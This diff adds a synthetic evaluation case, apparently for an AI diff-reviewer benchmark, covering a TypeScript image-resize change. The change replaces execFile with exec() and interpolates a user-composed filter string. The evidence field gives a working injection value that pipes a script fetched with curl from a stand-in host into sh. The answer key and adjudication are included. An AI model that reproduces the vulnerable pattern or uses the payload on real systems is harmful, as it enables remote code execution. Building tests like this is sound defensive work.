@@ -1,0 +1,58 @@
+{
+  "id": "C070",
+  "title": "Image filter expression passed to exec for shell evaluation",
+  "stack": "typescript",
+  "change_class": "injection",
+  "risk_class": "critical_positive",
+  "family_group": "G70",
+  "fixture": {
+    "kind": "trees",
+    "base": {
+      "src/images/resize.ts": "import { execFile } from \"child_process\";\n\nexport function resize(src: string, w: number): Promise<string> {\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n  });\n}\n"
+    },
+    "head": {
+      "src/images/resize.ts": "import { exec } from \"child_process\";\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  // -filter flag needs a shell for the user-composed filter expressions\n  return new Promise((res, rej) => {\n    exec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n  });\n}\n"
+    },
+    "pr_metadata": {
+      "title": "Custom resize filters",
+      "body": "Power users compose filter expressions.",
+      "deceptive": false
+    },
+    "revision_pin": "fixture:sha256:6e456e5259d4fa9eaaebf0a360570443bfe22d02036698d6f66c9cafdddab879"
+  },
+  "labels": [
+    {
+      "id": "C070-d1",
+      "severity": "critical",
+      "path": "src/images/resize.ts",
+      "defect": "Shell command injection: user-composed filter expression interpolated into an exec() command line",
+      "evidence": "Reproducible: filter=\"x; curl https://example.invalid/s.sh | sh; #\" terminates the quoted command and runs the fetched script as the service user; exec() always spawns a shell, unlike the base execFile array form.",
+      "introduced_by_change": true,
+      "ambiguous": false,
+      "keywords": [
+        "exec(",
+        "filter",
+        "convert"
+      ],
+      "window": 25
+    }
+  ],
+  "expected": {
+    "must_flag": [
+      "C070-d1"
+    ],
+    "must_not_flag": []
+  },
+  "adjudication": {
+    "status": "adjudicated",
+    "adjudicator": "independent-reviewer-v1",
+    "blind": true,
+    "verdict": "confirmed",
+    "notes": "execFile argv array switched to exec() with unquoted user-composed filter interpolated: trivial shell injection absent in base."
+  },
+  "rights": {
+    "origin": "original synthetic fixture authored for this corpus (repository MIT)",
+    "egress": "synthetic; no real secrets, hosts, or user data"
+  },
+  "schema": "ai-diff-reviewer/eval-case/1"
+}
